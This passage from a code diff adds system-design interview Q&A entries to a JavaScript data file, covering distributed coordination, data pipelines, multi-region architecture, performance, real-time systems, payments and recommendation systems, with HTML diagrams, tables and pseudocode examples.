+Query embedding is close to:
+  "budget sneakers for jogging"
+  "affordable trainers"
+  "lightweight road shoes"
+Even if exact words differ.</pre>
+<p><strong>Architecture:</strong></p>
+<div class="arch-box">
+  <div class="arch-title">Vector Search</div>
+  <div class="arch-row"><span class="arch-node primary">Document</span><span class="arch-arrow">→</span><span class="arch-node warn">Embedding Model</span><span class="arch-arrow">→</span><span class="arch-node info">Vector DB</span><span class="arch-arrow">→</span><span class="arch-node success">ANN Search</span></div>
+</div>
+<ul>
+<li><strong>ANN index</strong> — approximate nearest neighbor search, much faster than scanning every vector.</li>
+<li><strong>Hybrid search</strong> — combine keyword score + vector score for better relevance.</li>
+<li><strong>Filtering</strong> — filter by tenant, category, price, permissions before or during vector search.</li>
+</ul>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Trade-off:</strong> Vector search is powerful but not magic. It needs good embeddings, relevance evaluation, access-control filtering, and often keyword search too.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// DISTRIBUTED COORDINATION
+// ══════════════════════════════════════════════════════════════════
+{id:'coordination',section:'Distributed Coordination',icon:'🧭',level:'intermediate',
+q:'What is leader election and why do distributed systems need it?',
+a:`<p>Leader election chooses one node to coordinate work when multiple nodes are running. It prevents duplicate scheduling, conflicting writes, or split-brain behavior.</p>
+<pre>// Example: scheduled billing job
+You run 5 BillingScheduler instances for HA.
+Only one should charge customers at midnight.
+
+Without leader election:
+  all 5 instances run → customers charged 5 times
+
+With leader election:
+  one instance becomes leader → runs job
+  if leader dies → another instance takes over</pre>
+<div class="arch-box">
+  <div class="arch-title">Leader Election</div>
+  <div class="arch-row"><span class="arch-node primary">Node A</span><span class="arch-arrow">→</span><span class="arch-node warn">Lease in etcd/ZooKeeper</span><span class="arch-arrow">→</span><span class="arch-node success">Leader</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node">Node B/C</span><span class="arch-arrow">→</span><span class="arch-node info">Watch lease</span><span class="arch-arrow">→</span><span class="arch-node">Standby</span></div>
+</div>
+<p><strong>Common tools:</strong> ZooKeeper, etcd, Consul, Kubernetes Lease API. They provide strongly consistent primitives for ephemeral nodes, leases, and watches.</p>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Safety rule:</strong> Use leases with expiry, not permanent locks. If a leader crashes, its lease must expire so another node can safely continue.</div></div>`},
+
+{id:'coordination',section:'Distributed Coordination',icon:'🧭',level:'advanced',
+q:'What is distributed consensus? Explain Raft in simple terms.',
+a:`<p>Consensus lets multiple machines agree on one ordered log of decisions, even when some machines fail. Raft is a consensus algorithm designed to be understandable.</p>
+<ul>
+<li><strong>Leader</strong> — handles client writes and appends log entries.</li>
+<li><strong>Followers</strong> — replicate leader log.</li>
+<li><strong>Majority quorum</strong> — an entry is committed when most nodes store it.</li>
+</ul>
+<pre>// 5-node Raft cluster
+Client writes: set config.theme = dark
+Leader appends entry #42 to its log
+Leader sends AppendEntries to followers
+3 of 5 nodes acknowledge → majority reached
+Entry is committed and applied to state machine
+
+If leader dies:
+followers hold election → node with newest log wins</pre>
+<table class="comp-table">
+<tr><th>Cluster size</th><th>Failures tolerated</th><th>Majority needed</th></tr>
+<tr><td>3 nodes</td><td>1 failure</td><td>2 votes</td></tr>
+<tr><td>5 nodes</td><td>2 failures</td><td>3 votes</td></tr>
+<tr><td>7 nodes</td><td>3 failures</td><td>4 votes</td></tr>
+</table>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>Used in:</strong> etcd, Consul, CockroachDB, TiKV, and many control-plane systems. Consensus is for small critical metadata, not high-volume user events.</div></div>`},
+
+{id:'coordination',section:'Distributed Coordination',icon:'🧭',level:'intermediate',
+q:'What are distributed locks? When should you avoid them?',
+a:`<p>A distributed lock ensures only one process across many machines enters a critical section. It is useful, but easy to misuse.</p>
+<pre>// Example: process one invoice exactly once
+lockKey = "invoice:123:lock"
+if acquireLock(lockKey, ttl=30s):
+  try:
+    generateInvoice(123)
+  finally:
+    releaseLock(lockKey)
+else:
+  retry later</pre>
+<p><strong>Good use cases:</strong> rare administrative jobs, preventing duplicate background work, short critical sections.</p>
+<p><strong>Avoid locks when:</strong> the operation is high-throughput, long-running, or can be modeled as idempotent writes. Prefer unique constraints, idempotency keys, queues with partitioning, or optimistic concurrency.</p>
+<table class="comp-table">
+<tr><th>Problem</th><th>Better primitive</th></tr>
+<tr><td>Prevent duplicate payment</td><td>Idempotency key + DB unique constraint</td></tr>
+<tr><td>One worker per user</td><td>Kafka partition by userId</td></tr>
+<tr><td>Update if version matches</td><td>Optimistic locking with version column</td></tr>
+</table>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>TTL matters:</strong> Every distributed lock needs an expiry. Without TTL, a crashed process can hold the lock forever.</div></div>`},
+
+{id:'coordination',section:'Distributed Coordination',icon:'🧭',level:'advanced',
+q:'What is split-brain and how do you prevent it?',
+a:`<p>Split-brain happens when two parts of a distributed system both believe they are the primary/leader after a network partition. This can cause conflicting writes.</p>
+<pre>// 3-node database cluster
+Before partition:
+  A = primary, B/C = replicas
+
+Network split:
+  A isolated alone
+  B and C can talk to each other
+
+Bad behavior:
+  A still accepts writes
+  B elects itself primary and also accepts writes
+  Later merge → conflicting histories</pre>
+<p><strong>Prevention techniques:</strong></p>
+<ul>
+<li><strong>Quorum writes</strong> — require majority before accepting writes. Isolated minority cannot proceed.</li>
+<li><strong>Fencing tokens</strong> — every leader gets a monotonically increasing token; storage rejects old leaders.</li>
+<li><strong>Lease expiry</strong> — old leader must stop when it cannot renew lease.</li>
+<li><strong>STONITH/fencing</strong> — forcibly remove unhealthy node in infrastructure-level clusters.</li>
+</ul>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Interview phrase:</strong> During a partition, only the side with quorum should accept writes. The minority should become read-only or unavailable to protect consistency.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// DATA PIPELINES
+// ══════════════════════════════════════════════════════════════════
+{id:'pipelines',section:'Data Pipelines',icon:'🏭',level:'intermediate',
+q:'What is ETL vs ELT? How do data pipelines work?',
+a:`<p>Data pipelines move data from operational systems into analytics, ML, reporting, or search systems.</p>
+<table class="comp-table">
+<tr><th></th><th>ETL</th><th>ELT</th></tr>
+<tr><td>Meaning</td><td>Extract, Transform, Load</td><td>Extract, Load, Transform</td></tr>
+<tr><td>Transform happens</td><td>Before warehouse</td><td>Inside warehouse/lakehouse</td></tr>
+<tr><td>Best for</td><td>Strict schemas, legacy warehouses</td><td>Cloud warehouses, flexible analytics</td></tr>
+<tr><td>Examples</td><td>Informatica, custom Spark jobs</td><td>Fivetran + dbt + BigQuery/Snowflake</td></tr>
+</table>
+<div class="arch-box">
+  <div class="arch-title">Modern ELT Pipeline</div>
+  <div class="arch-row"><span class="arch-node primary">App DB</span><span class="arch-arrow">→</span><span class="arch-node warn">CDC</span><span class="arch-arrow">→</span><span class="arch-node info">Data Lake</span><span class="arch-arrow">→</span><span class="arch-node success">Warehouse</span><span class="arch-arrow">→</span><span class="arch-node">Dashboards</span></div>
+</div>
+<pre>// Example: ecommerce analytics
+orders table → CDC stream → raw_orders in warehouse
+dbt transforms raw_orders into:
+  daily_revenue
+  customer_lifetime_value
+  product_conversion_rate</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Design rule:</strong> Keep raw immutable data. If a transformation bug happens, you can rebuild the cleaned tables from raw events.</div></div>`},
+
+{id:'pipelines',section:'Data Pipelines',icon:'🏭',level:'intermediate',
+q:'What is stream processing? When do you use Kafka Streams, Flink, or Spark Streaming?',
+a:`<p>Stream processing computes results continuously as events arrive, instead of waiting for a nightly batch job.</p>
+<pre>// Real-time fraud example
+payment.created events stream in
+For each card:
+  count transactions in last 5 minutes
+  sum amount in last 1 hour
+  detect impossible location jumps
+If suspicious → emit fraud.alert event</pre>
+<table class="comp-table">
+<tr><th>Tool</th><th>Best for</th><th>Notes</th></tr>
+<tr><td>Kafka Streams</td><td>Simple app-level stream processing</td><td>Runs inside your service</td></tr>
+<tr><td>Apache Flink</td><td>Low-latency, stateful, event-time processing</td><td>Great for complex real-time jobs</td></tr>
+<tr><td>Spark Streaming</td><td>Large-scale analytics, batch + stream</td><td>Often micro-batch</td></tr>
+</table>
+<p><strong>Core concepts:</strong> windowing, watermarks, state stores, checkpointing, exactly-once sinks, and replay from offsets.</p>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Late events:</strong> Real streams arrive out of order. Use event time and watermarks so a 10:01 event that arrives at 10:04 is still counted in the correct 10:00-10:05 window.</div></div>`},
+
+{id:'pipelines',section:'Data Pipelines',icon:'🏭',level:'advanced',
+q:'What is Change Data Capture (CDC) and why is it useful?',
+a:`<p>Change Data Capture reads committed changes from a database log and publishes them as events. It avoids polling tables and catches every insert, update, and delete.</p>
+<div class="arch-box">
+  <div class="arch-title">CDC Flow</div>
+  <div class="arch-row"><span class="arch-node primary">PostgreSQL WAL</span><span class="arch-arrow">→</span><span class="arch-node warn">Debezium</span><span class="arch-arrow">→</span><span class="arch-node info">Kafka</span><span class="arch-arrow">→</span><span class="arch-node success">Search / Cache / Warehouse</span></div>
+</div>
+<pre>// orders table update
+UPDATE orders SET status='PAID' WHERE id=42;
+
+// CDC event
+{
+  table: "orders",
+  op: "update",
+  before: { id: 42, status: "PENDING" },
+  after:  { id: 42, status: "PAID" },
+  lsn: "16/B374D848"
+}</pre>
+<p><strong>Uses:</strong> syncing search indexes, cache invalidation, analytics ingestion, audit logs, data warehouse replication, and microservice read models.</p>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Why CDC is strong:</strong> The database commit log is the truth of what actually changed. If your app crashes after committing but before publishing an event, CDC still sees the change.</div></div>`},
+
+{id:'pipelines',section:'Data Pipelines',icon:'🏭',level:'advanced',
+q:'How do you design an analytics events system?',
+a:`<p>An analytics system collects user events, stores raw data cheaply, and produces fast aggregated views for dashboards and experiments.</p>
+<div class="arch-box">
+  <div class="arch-title">Analytics Events Architecture</div>
+  <div class="arch-row"><span class="arch-node primary">Web/Mobile SDK</span><span class="arch-arrow">→</span><span class="arch-node warn">Event Collector</span><span class="arch-arrow">→</span><span class="arch-node info">Kafka</span><span class="arch-arrow">→</span><span class="arch-node success">S3 Data Lake</span><span class="arch-arrow">→</span><span class="arch-node">Warehouse</span></div>
+</div>
+<pre>// Event schema
+{
+  eventId: "uuid",
+  userId: "u123",
+  eventName: "product_viewed",
+  timestamp: "2026-05-11T10:30:00Z",
+  properties: { productId: "p9", source: "search" }
+}
+
+// Dashboard query
+product_viewed → add_to_cart → checkout_started → payment_success
+Compute conversion at each funnel step</pre>
+<p><strong>Design choices:</strong> batch events on the client, use schema validation, dedupe by eventId, partition Kafka by userId or eventName, store raw events forever, and build aggregates for common dashboards.</p>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Privacy:</strong> Do not log passwords, tokens, full card numbers, or unnecessary PII. Analytics pipelines often become accidental data leaks.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// MULTI-REGION ARCHITECTURE
+// ══════════════════════════════════════════════════════════════════
+{id:'multiregion',section:'Multi-Region Architecture',icon:'🌍',level:'intermediate',
+q:'What is active-active vs active-passive multi-region architecture?',
+a:`<p>Multi-region design improves latency and disaster recovery, but it makes data consistency much harder.</p>
+<table class="comp-table">
+<tr><th></th><th>Active-Passive</th><th>Active-Active</th></tr>
+<tr><td>Traffic</td><td>One primary region serves users</td><td>Multiple regions serve users</td></tr>
+<tr><td>Failover</td><td>Promote standby region</td><td>Route away from failed region</td></tr>
+<tr><td>Complexity</td><td>Lower</td><td>High</td></tr>
+<tr><td>Consistency</td><td>Simpler single-writer model</td><td>Conflict handling needed</td></tr>
+<tr><td>Best for</td><td>Most business apps</td><td>Global low-latency products</td></tr>
+</table>
+<div class="arch-box">
+  <div class="arch-title">Active-Passive</div>
+  <div class="arch-row"><span class="arch-node primary">Users</span><span class="arch-arrow">→</span><span class="arch-node success">US-East Primary</span><span class="arch-arrow">→</span><span class="arch-node warn">Async Replication</span><span class="arch-arrow">→</span><span class="arch-node info">EU-West Standby</span></div>
+</div>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Interview default:</strong> Start active-passive unless the requirements explicitly need global low latency or regional independence. Active-active is expensive in design complexity.</div></div>`},
+
+{id:'multiregion',section:'Multi-Region Architecture',icon:'🌍',level:'intermediate',
+q:'What are RPO and RTO in disaster recovery?',
+a:`<p>RPO and RTO describe how much data loss and downtime the business can tolerate.</p>
+<ul>
+<li><strong>RPO (Recovery Point Objective)</strong> — maximum acceptable data loss.</li>
+<li><strong>RTO (Recovery Time Objective)</strong> — maximum acceptable time to restore service.</li>
+</ul>
+<pre>// Example systems
+Blog platform:
+  RPO: 1 hour data loss acceptable
+  RTO: restore within 4 hours
+  Strategy: backups + restore runbook
+
+Payment system:
+  RPO: near zero
+  RTO: under 5 minutes
+  Strategy: replicated database, tested failover, idempotent writes</pre>
+<table class="comp-table">
+<tr><th>Strategy</th><th>Cost</th><th>RPO/RTO</th></tr>
+<tr><td>Backups only</td><td>Low</td><td>Hours</td></tr>
+<tr><td>Warm standby</td><td>Medium</td><td>Minutes to hour</td></tr>
+<tr><td>Hot standby</td><td>High</td><td>Minutes</td></tr>
+<tr><td>Active-active</td><td>Highest</td><td>Seconds to minutes</td></tr>
+</table>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Reality check:</strong> Backups you never restore are just hopeful files. Disaster recovery plans must be tested regularly.</div></div>`},
+
+{id:'multiregion',section:'Multi-Region Architecture',icon:'🌍',level:'advanced',
+q:'How do you handle data consistency across regions?',
+a:`<p>Cross-region consistency is slow because speed of light matters. A round trip between continents can take 100-200ms, so strong global writes add visible latency.</p>
+<table class="comp-table">
+<tr><th>Pattern</th><th>How it works</th><th>Best for</th></tr>
+<tr><td>Single writer region</td><td>All writes go to one region; reads can be local replicas</td><td>Simple consistency</td></tr>
+<tr><td>Region-owned data</td><td>User's data lives in home region</td><td>SaaS, compliance</td></tr>
+<tr><td>Multi-master</td><td>Every region accepts writes</td><td>Low latency, conflict-tolerant data</td></tr>
+<tr><td>Global consensus</td><td>Quorum across regions</td><td>Strong consistency, lower write speed</td></tr>
+</table>
+<pre>// Region-owned user data
+userId u123 homeRegion = ap-south-1
+Reads from India → ap-south-1 replica
+Writes from anywhere → routed to ap-south-1 primary
+
+// Avoid conflict because one region owns that user's writes</pre>
+<p><strong>Conflict resolution options:</strong> last-write-wins, version vectors, CRDTs, manual merge, or domain-specific rules such as "highest cart quantity wins".</p>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Good answer:</strong> Do not promise strong consistency everywhere unless required. Classify each data type: payments need strong consistency; likes, counters, presence, and feeds often tolerate eventual consistency.</div></div>`},
+
+{id:'multiregion',section:'Multi-Region Architecture',icon:'🌍',level:'advanced',
+q:'How do DNS, GeoDNS, and global load balancing route users?',
+a:`<p>Global routing sends users to a nearby healthy region using DNS, anycast, or a global load balancer.</p>
+<div class="arch-box">
+  <div class="arch-title">Global Routing</div>
+  <div class="arch-row"><span class="arch-node primary">User in India</span><span class="arch-arrow">→</span><span class="arch-node warn">GeoDNS / Global LB</span><span class="arch-arrow">→</span><span class="arch-node success">ap-south-1</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node primary">User in Germany</span><span class="arch-arrow">→</span><span class="arch-node warn">GeoDNS / Global LB</span><span class="arch-arrow">→</span><span class="arch-node info">eu-central-1</span></div>
+</div>
+<ul>
+<li><strong>Latency routing</strong> — choose region with lowest network latency.</li>
+<li><strong>Geo routing</strong> — choose region by country/continent or compliance rules.</li>
+<li><strong>Health checks</strong> — stop sending traffic to unhealthy regions.</li>
+<li><strong>Weighted routing</strong> — send 10% to a new region during rollout.</li>
+</ul>
+<pre>// Failure scenario
+ap-south-1 health check fails
+Global LB stops returning ap-south-1
+Indian users route to Singapore or EU
+Latency increases, but service stays available</pre>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>DNS limitation:</strong> DNS records are cached by clients and resolvers. Low TTL helps, but failover is not always instant. Critical systems use global load balancers or anycast for faster traffic steering.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// PERFORMANCE ENGINEERING
+// ══════════════════════════════════════════════════════════════════
+{id:'performance',section:'Performance Engineering',icon:'🚀',level:'intermediate',
+q:'How do you find and fix bottlenecks in a system?',
+a:`<p>A bottleneck is the resource or component limiting total throughput. Fixing anything else gives little benefit.</p>
+<pre>// Example: API is slow
+Request p95: 1800ms
+Breakdown from trace:
+  Auth middleware: 20ms
+  App logic:       40ms
+  DB query:      1650ms  ← bottleneck
+  JSON encode:     10ms
+
+Fix the DB query first, not the JSON encoding.</pre>
+<p><strong>Common bottlenecks:</strong></p>
+<ul>
+<li><strong>Database</strong> — missing indexes, N+1 queries, lock contention, slow joins.</li>
+<li><strong>Network</strong> — too many round trips, large payloads, cross-region calls.</li>
+<li><strong>CPU</strong> — expensive serialization, compression, encryption, image processing.</li>
+<li><strong>Memory</strong> — leaks, too much caching, large in-memory joins.</li>
+<li><strong>Queue</strong> — consumers too slow; queue age grows.</li>
+</ul>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Method:</strong> Measure first, change one thing, measure again. In interviews, say what metric proves the bottleneck: p95 latency, CPU saturation, DB QPS, lock wait time, queue age, or cache hit rate.</div></div>`},
+
+{id:'performance',section:'Performance Engineering',icon:'🚀',level:'intermediate',
+q:'What is connection pooling and why does it matter?',
+a:`<p>A connection pool reuses expensive network/database connections instead of opening a new one per request.</p>
+<pre>// Without pooling
+Every request:
+  TCP handshake
+  TLS handshake
+  DB authentication
+  Query
+  Close connection
+Result: slow and DB overwhelmed
+
+// With pooling
+App starts with 20 warm DB connections.
+Each request borrows one, runs query, returns it.</pre>
+<p><strong>Pool sizing rule:</strong> Bigger is not always better. Too many DB connections increase context switching and memory usage. Start small, measure wait time, and scale carefully.</p>
+<table class="comp-table">
+<tr><th>Symptom</th><th>Likely cause</th><th>Fix</th></tr>
+<tr><td>Requests wait for connection</td><td>Pool too small or slow queries</td><td>Optimize queries, then increase pool</td></tr>
+<tr><td>DB CPU high with many idle connections</td><td>Pool too large</td><td>Reduce pool or add proxy like PgBouncer</td></tr>
+<tr><td>Connection storms on deploy</td><td>All pods reconnect at once</td><td>Stagger deploys, use connection proxy</td></tr>
+</table>`},
+
+{id:'performance',section:'Performance Engineering',icon:'🚀',level:'advanced',
+q:'What is backpressure and how do you apply it?',
+a:`<p>Backpressure is a way for overloaded consumers to tell producers to slow down. Without it, queues grow, memory fills, latency explodes, and systems crash.</p>
+<div class="arch-box">
+  <div class="arch-title">Backpressure</div>
+  <div class="arch-row"><span class="arch-node primary">Producer 10k/s</span><span class="arch-arrow">→</span><span class="arch-node warn">Queue growing</span><span class="arch-arrow">→</span><span class="arch-node danger">Consumer 2k/s</span></div>
+</div>
+<p><strong>Techniques:</strong></p>
+<ul>
+<li><strong>Bounded queues</strong> — reject or shed load when full.</li>
+<li><strong>Rate limiting</strong> — slow producers before downstream systems fail.</li>
+<li><strong>HTTP 429 / Retry-After</strong> — tell clients to retry later.</li>
+<li><strong>Kafka consumer lag monitoring</strong> — add consumers or pause producers when lag grows.</li>
+<li><strong>Adaptive concurrency</strong> — reduce in-flight requests when latency rises.</li>
+</ul>
+<pre>// API overload policy
+if queueDepth > 10000:
+  return 429 Retry-After: 30
+if dependencyLatencyP95 > 2s:
+  serve cached/stale response if possible
+else:
+  process normally</pre>`},
+
+{id:'performance',section:'Performance Engineering',icon:'🚀',level:'advanced',
+q:'How do batching, compression, and pagination improve performance?',
+a:`<p>These reduce round trips, payload size, and memory pressure.</p>
+<table class="comp-table">
+<tr><th>Technique</th><th>Problem solved</th><th>Example</th></tr>
+<tr><td>Batching</td><td>Too many small requests</td><td>Fetch 100 user profiles in one DB query</td></tr>
+<tr><td>Compression</td><td>Large response bodies</td><td>gzip/brotli JSON, compress logs</td></tr>
+<tr><td>Pagination</td><td>Huge result sets</td><td>Return 50 records at a time</td></tr>
+</table>
+<pre>// Bad pagination: offset gets slower as table grows
+GET /orders?offset=1000000&limit=50
+
+// Better: cursor pagination
+GET /orders?after=order_987654&limit=50
+WHERE createdAt < :cursorCreatedAt
+ORDER BY createdAt DESC
+LIMIT 50</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Cursor pagination</strong> is better for feeds, timelines, and large tables because the DB can continue from an indexed position instead of skipping millions of rows.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// REAL-TIME SYSTEMS
+// ══════════════════════════════════════════════════════════════════
+{id:'realtime',section:'Real-Time Systems',icon:'📡',level:'intermediate',
+q:'How do you design presence indicators like online/offline/typing?',
+a:`<p>Presence is eventually consistent. It should feel real-time, but it cannot be perfectly accurate because devices disconnect silently.</p>
+<div class="arch-box">
+  <div class="arch-title">Presence Flow</div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">WebSocket Gateway</span><span class="arch-arrow">→</span><span class="arch-node info">Redis Presence</span><span class="arch-arrow">→</span><span class="arch-node success">Subscribers</span></div>
+</div>
+<pre>// Heartbeat approach
+Client sends heartbeat every 30s
+Redis key: presence:user:42 = online, TTL 90s
+If heartbeats stop, key expires automatically → offline
+
+Typing indicator:
+Redis key: typing:chat:9:user:42 = true, TTL 5s</pre>
+<p><strong>Important:</strong> Do not write every heartbeat to the main database. Use Redis or an in-memory presence service with TTLs.</p>`},
+
+{id:'realtime',section:'Real-Time Systems',icon:'📡',level:'intermediate',
+q:'How do push notifications work?',
+a:`<p>Push notifications use platform-specific services because mobile operating systems do not let every app maintain a permanent background connection.</p>
+<div class="arch-box">
+  <div class="arch-title">Push Notification Flow</div>
+  <div class="arch-row"><span class="arch-node primary">App Backend</span><span class="arch-arrow">→</span><span class="arch-node warn">Notification Worker</span><span class="arch-arrow">→</span><span class="arch-node info">APNs / FCM</span><span class="arch-arrow">→</span><span class="arch-node success">Device</span></div>
+</div>
+<pre>// Device registration
+Mobile app asks OS for push token
+App sends token to backend:
+  POST /devices { token, platform, userId }
+
+// Send notification
+Backend enqueues notification
+Worker checks user preferences
+Worker sends to APNs (iOS) or FCM (Android)</pre>
+<p><strong>System concerns:</strong> user preferences, quiet hours, deduplication, retries, token invalidation, rate limits, localization, and provider failures.</p>`},
+
+{id:'realtime',section:'Real-Time Systems',icon:'📡',level:'advanced',
+q:'How do live streaming systems work at scale?',
+a:`<p>Live video systems ingest a broadcaster stream, transcode it into multiple qualities, segment it, and distribute it through a CDN.</p>
+<div class="arch-box">
+  <div class="arch-title">Live Video Architecture</div>
+  <div class="arch-row"><span class="arch-node primary">Broadcaster</span><span class="arch-arrow">→</span><span class="arch-node warn">Ingest</span><span class="arch-arrow">→</span><span class="arch-node info">Transcoder</span><span class="arch-arrow">→</span><span class="arch-node success">CDN</span><span class="arch-arrow">→</span><span class="arch-node">Viewers</span></div>
+</div>
+<pre>// Adaptive bitrate ladder
+1080p 6 Mbps
+720p  3 Mbps
+480p  1 Mbps
+360p  600 Kbps
+
+Player switches quality based on network speed.</pre>
+<p><strong>Protocols:</strong> RTMP/WebRTC for ingest, HLS/DASH for scalable viewer playback, WebRTC for ultra-low latency interactive streams.</p>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Trade-off:</strong> HLS scales extremely well through CDNs but has higher latency. WebRTC gives sub-second latency but is harder and more expensive to scale.</div></div>`},
+
+{id:'realtime',section:'Real-Time Systems',icon:'📡',level:'advanced',
+q:'How do collaborative editing systems like Google Docs work?',
+a:`<p>Collaborative editing must merge concurrent edits from many users without corrupting the document.</p>
+<ul>
+<li><strong>Operational Transformation (OT)</strong> — transforms operations against concurrent operations so intent is preserved.</li>
+<li><strong>CRDT</strong> — data structure designed so replicas can merge automatically without central coordination.</li>
+</ul>
+<pre>// Starting text: "hello"
+User A inserts "!" at position 5 → "hello!"
+User B inserts "y" at position 0 → "yhello"
+
+System must merge to "yhello!" without losing either edit.</pre>
+<div class="arch-box">
+  <div class="arch-title">Collaboration Architecture</div>
+  <div class="arch-row"><span class="arch-node primary">Editor Clients</span><span class="arch-arrow">↔</span><span class="arch-node warn">Collab Server</span><span class="arch-arrow">→</span><span class="arch-node info">Operation Log</span><span class="arch-arrow">→</span><span class="arch-node success">Snapshots</span></div>
+</div>
+<p><strong>Practical design:</strong> keep an append-only operation log, broadcast operations over WebSocket, periodically compact into snapshots, and use version numbers to reject or transform stale operations.</p>`},
+
+// ══════════════════════════════════════════════════════════════════
+// PAYMENTS & IDEMPOTENCY
+// ══════════════════════════════════════════════════════════════════
+{id:'payments',section:'Payments & Idempotency',icon:'💳',level:'intermediate',
+q:'How do you design a payment flow safely?',
+a:`<p>Payment systems prioritize correctness, idempotency, auditability, and clear state transitions.</p>
+<div class="arch-box">
+  <div class="arch-title">Payment Flow</div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">Order Service</span><span class="arch-arrow">→</span><span class="arch-node info">Payment Service</span><span class="arch-arrow">→</span><span class="arch-node success">Payment Provider</span></div>
+</div>
+<pre>// Payment state machine
+CREATED
+  → AUTHORIZING
+  → AUTHORIZED
+  → CAPTURED
+  → REFUNDED
+
+Failure states:
+  AUTH_FAILED
+  CAPTURE_FAILED
+  CANCELLED</pre>
+<p><strong>Rules:</strong> never trust the client for price, use provider webhooks as source of payment outcome, store every provider request/response, and reconcile provider reports with your ledger.</p>`},
+
+{id:'payments',section:'Payments & Idempotency',icon:'💳',level:'intermediate',
+q:'What is an idempotency key and why is it critical?',
+a:`<p>An idempotency key lets a client safely retry a request without performing the action twice.</p>
+<pre>// Client sends same key on retry
+POST /payments
+Idempotency-Key: pay_abc123
+{ orderId: 42, amount: 999 }
+
+Server logic:
+if key exists:
+  return stored response
+else:
+  process payment
+  store key + response atomically</pre>
+<table class="comp-table">
+<tr><th>Without idempotency</th><th>With idempotency</th></tr>
+<tr><td>Network timeout can cause double charge</td><td>Retry returns same payment result</td></tr>
+<tr><td>User refresh creates duplicate order</td><td>Same key maps to same order/payment</td></tr>
+<tr><td>Hard to recover from partial failures</td><td>Operation can be safely retried</td></tr>
+</table>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Implementation:</strong> Put a unique constraint on the idempotency key and store the final response. Atomicity matters: key creation and business action must not drift.</div></div>`},
+
+{id:'payments',section:'Payments & Idempotency',icon:'💳',level:'advanced',
+q:'What is a ledger and how do you model money movement?',
+a:`<p>A ledger records immutable financial entries. You do not update balances directly as the source of truth; you append debit and credit entries and derive balances.</p>
+<pre>// Double-entry accounting
+User pays $10
+
+Debit:  user_cash_account       -$10
+Credit: merchant_receivable     +$10
+
+Platform fee $1
+Debit:  merchant_receivable     -$1
+Credit: platform_revenue        +$1</pre>
+<p><strong>Ledger properties:</strong></p>
+<ul>
+<li>Append-only entries, never destructive updates.</li>
+<li>Every transaction balances: total debits = total credits.</li>
+<li>Use integer minor units (cents/paise), not floating point.</li>
+<li>Every entry has idempotency key, timestamp, currency, and audit metadata.</li>
+</ul>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Money rule:</strong> Never store money in floating point. Use integers: 1099 cents instead of 10.99 dollars.</div></div>`},
+
+{id:'payments',section:'Payments & Idempotency',icon:'💳',level:'advanced',
+q:'How do refunds, chargebacks, and reconciliation work?',
+a:`<p>Real payment systems must handle asynchronous outcomes after the original checkout succeeds.</p>
+<ul>
+<li><strong>Refund</strong> — merchant returns money to customer.</li>
+<li><strong>Chargeback</strong> — customer disputes through bank/card network.</li>
+<li><strong>Reconciliation</strong> — compare your ledger against provider/bank settlement reports.</li>
+</ul>
+<pre>// Daily reconciliation
+Provider report:
+  payment p1 captured 999
+  refund r1 settled -300
+
+Internal ledger:
+  p1 captured 999
+  r1 pending -300
+
+Action:
+  mark r1 as settled and create settlement entry</pre>
+<div class="arch-box">
+  <div class="arch-title">Payment Reliability Loop</div>
+  <div class="arch-row"><span class="arch-node primary">Provider Webhook</span><span class="arch-arrow">→</span><span class="arch-node warn">Idempotent Handler</span><span class="arch-arrow">→</span><span class="arch-node info">Ledger</span><span class="arch-arrow">→</span><span class="arch-node success">Reconciliation Job</span></div>
+</div>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Webhook rule:</strong> Providers retry webhooks and may deliver them out of order. Handlers must be idempotent and state-machine aware.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// AI / ML SYSTEM DESIGN
+// ══════════════════════════════════════════════════════════════════
+{id:'ai',section:'AI/ML Systems',icon:'🤖',level:'intermediate',
+q:'How do recommendation systems work?',
+a:`<p>Recommendation systems rank items a user is likely to engage with. They usually combine candidate generation, ranking, and re-ranking.</p>
+<div class="arch-box">
+  <div class="arch-title">Recommendation Pipeline</div>
+  <div class="arch-row"><span class="arch-node primary">User Events</span><span class="arch-arrow">→</span><span class="arch-node warn">Feature Store</span><span class="arch-arrow">→</span><span class="arch-node info">Candidate Generation</span><span class="arch-arrow">→</span><span class="arch-node success">Ranker</span></div>
+</div>
+<pre>// Candidate sources
+Similar users liked X
+User viewed category: running shoes
+Trending near user's region
+Sponsored products
+Recently added items
+
+Rank by predicted click/buy/watch probability.</pre>
+<p><strong>Cold start:</strong> for new users use popular/trending/contextual items; for new items boost exploration until enough engagement data exists.</p>`},
+
+{id:'ai',section:'AI/ML Systems',icon:'🤖',level:'intermediate',
+q:'What is a feature store and why is it used?',
